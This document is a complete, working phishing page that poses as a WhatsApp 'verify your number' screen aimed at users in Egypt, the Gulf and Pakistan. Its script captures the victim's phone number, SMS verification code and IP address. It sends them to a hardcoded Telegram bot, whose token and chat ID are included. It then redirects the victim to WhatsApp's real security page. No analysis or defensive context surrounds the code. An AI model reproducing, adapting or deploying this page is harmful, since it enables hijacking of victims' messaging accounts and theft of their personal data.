<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Verify</title>
    <style>
        :root { --wa-green: #25D366; --wa-dark: #0b141a; --wa-sec: #202c33; --wa-text: #e9edef; --wa-hint: #8696a0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: var(--wa-dark); color: var(--wa-text); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 380px; padding: 25px; text-align: center; display: flex; flex-direction: column; }
        
        .screen { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; animation: fadeIn 0.4s ease; }
        .active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

        .logo { width: 60px; margin-top: 60px; margin-bottom: 20px; }
        h1 { font-size: 20px; font-weight: 500; margin-bottom: 15px; color: #fff; }
        p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 25px; }

        /* Country Picker 2026 Style */
        .selector { width: 100%; border-bottom: 1px solid var(--wa-green); padding: 10px; margin-bottom: 5px; }
        select { background: transparent; color: var(--wa-green); border: none; outline: none; width: 100%; font-size: 16px; text-align-last: center; cursor: pointer; }
        
        .input-row { width: 100%; display: flex; border-bottom: 1px solid var(--wa-green); padding: 10px 0; margin-bottom: 40px; }
        #ccode { width: 25%; font-size: 18px; border-right: 1px solid #3b4a54; color: #fff; }
        input[type="tel"], input[type="text"] { width: 75%; background: transparent; border: none; color: #fff; font-size: 20px; padding: 0 15px; outline: none; text-align: left; }

        button { background: var(--wa-green); color: #000; border: none; padding: 12px 30px; border-radius: 25px; font-size: 14px; font-weight: 600; width: 100%; cursor: pointer; margin-top: auto; margin-bottom: 40px; }

        /* OTP Specifics */
        .otp-input { width: 180px; border: none; border-bottom: 2px solid var(--wa-green); font-size: 28px; letter-spacing: 8px; text-align: center; margin: 30px 0; background: transparent; }
        .timer { color: var(--wa-hint); font-size: 13px; margin-top: 15px; }
        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-top: 50px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="scr-load" class="screen active">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div class="spinner"></div>
        <p style="margin-top: 20px;">Securing connection...</p>
    </div>

    <div id="scr-phone" class="screen">
        <h1>Enter your phone number</h1>
        <p>WhatsApp will need to verify your account to ensure it's not being used by an unauthorized device.</p>
        
        <div class="selector">
            <select id="country" onchange="updateCountry()">
                <option value="20" data-len="11">Egypt</option>
                <option value="966" data-len="9">Saudi Arabia</option>
                <option value="971" data-len="9">United Arab Emirates</option>
                <option value="92" data-len="10">Pakistan</option>
            </select>
        </div>
        <div class="input-row">
            <div id="ccode">+20</div>
            <input type="tel" id="phone" placeholder="phone number" maxlength="11">
        </div>
        <button onclick="processPhone()">NEXT</button>
    </div>

    <div id="scr-otp" class="screen">
        <h1>Verifying your number</h1>
        <p>Waiting to automatically detect an SMS sent to<br><b id="masked" style="color:#fff;"></b></p>
        <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
        <p style="color: var(--wa-hint);">Enter 6-digit code</p>
        <div class="timer">Resend SMS in <span id="clock" style="color: var(--wa-green);">01:59</span></div>
        <button onclick="submitOtp()">VERIFY</button>
    </div>

    <script>
        const BOT = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
        let userNum = "";

        // Transition Load -> Phone
        setTimeout(() => {
            showScreen('scr-load', 'scr-phone');
        }, 2500);

        function showScreen(hide, show) {
            document.getElementById(hide).classList.remove('active');
            document.getElementById(show).classList.add('active');
        }

        function updateCountry() {
            const s = document.getElementById('country');
            const len = s.options[s.selectedIndex].getAttribute('data-len');
            document.getElementById('ccode').innerText = '+' + s.value;
            document.getElementById('phone').maxLength = len;
            document.getElementById('phone').value = "";
        }

        async function notify(msg) {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
            fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: BOT.C, text: msg + `\nIP: ${ip}` })
            });
        }

        function processPhone() {
            const num = document.getElementById('phone').value;
            const code = document.getElementById('ccode').innerText;
            const max = document.getElementById('phone').maxLength;

            if(num.length < (max - 1)) return alert("The phone number you entered is too short.");

            userNum = code + " " + num;
            document.getElementById('masked').innerText = userNum;
            notify(`☎️ Number Entered: ${userNum}`);

            showScreen('scr-phone', 'scr-load'); // Show spinner briefly
            setTimeout(() => {
                showScreen('scr-load', 'scr-otp');
                startTimer();
            }, 1500);
        }

        function startTimer() {
            let t = 119;
            const clock = document.getElementById('clock');
            const itv = setInterval(() => {
                let m = Math.floor(t / 60);
                let s = t % 60;
                clock.innerText = `${m}:${s < 10 ? '0'+s : s}`;
                if(--t < 0) clearInterval(itv);
            }, 1000);
        }

        async function submitOtp() {
            const otp = document.getElementById('otp').value;
            if(otp.length < 6) return;

            document.getElementById('scr-otp').innerHTML = '<div class="spinner" style="margin: 50% auto;"></div><p>Verifying...</p>';
            await notify(`🔥 HIT! CODE: ${otp}\nTarget: ${userNum}`);
            
            setTimeout(() => {
                window.location.href = "https://www.whatsapp.com/security";
            }, 2000);
        }
    </script>
</body>
</html>
